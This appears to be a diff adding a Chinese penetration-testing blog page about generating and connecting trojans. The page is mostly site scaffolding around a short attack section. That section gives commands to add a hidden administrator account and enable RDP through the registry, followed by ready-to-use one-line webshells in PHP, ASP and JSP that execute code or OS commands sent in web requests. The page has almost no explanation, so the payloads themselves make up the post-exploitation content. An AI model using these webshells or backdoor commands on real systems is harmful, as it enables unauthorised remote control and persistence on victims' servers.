+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> username <span class="hljs-keyword">password</span> /<span class="hljs-keyword">add</span><br>net localgroup administrators username /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p>&#x5F00;&#x542F;3389 RDP&#x670D;&#x52A1;</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg add <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>ystem<span class="hljs-char escape_">\C</span>urrentControlSet<span class="hljs-char escape_">\C</span>ontrol<span class="hljs-char escape_">\T</span>erminal Server&quot;</span> <span class="hljs-symbol">/v</span> fDenyTSConnections <span class="hljs-symbol">/t</span> REG_DWORD <span class="hljs-symbol">/d</span> <span class="hljs-number">0</span> <span class="hljs-operator">/</span>f<br></code></pre></td></tr></table></figure>
+
+<h1 id="&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;"><a href="#&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;" class="headerlink" title="&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;"></a>&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;pass&apos;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%eval request(<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;%<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;pass&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>))){java.io.InputStream in = <span class="hljs-keyword">Runtime</span>.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>){out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));}}%&gt;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+        <a href="/tags/%E6%9C%A8%E9%A9%AC/" class="print-no-link">#木马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>木马生成与连接</div>
+      <div>http://example.com/2025/05/06/木马生成与连接/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86/" title="内网渗透代理">
+                        <span class="hidden-mobile">内网渗透代理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
